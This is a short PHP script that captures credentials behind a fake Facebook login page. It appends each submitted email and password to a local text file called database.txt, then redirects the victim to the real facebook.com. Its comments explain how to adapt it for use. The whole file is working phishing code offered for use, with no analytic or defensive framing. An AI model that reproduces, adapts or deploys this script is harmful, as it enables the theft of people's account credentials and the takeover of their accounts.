<?php
header ('Location: https://www.facebook.com'); //Page to redirect to after hitting login
$handle = fopen("database.txt", "a"); //Path to where you want to create txt for credentials
$content = file_get_contents("database.txt"); { //If you changed the path above change it here too
	fwrite($handle, "email=" . $_POST['email']);
	fwrite($handle, " | pass=" . $_POST['pass']);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>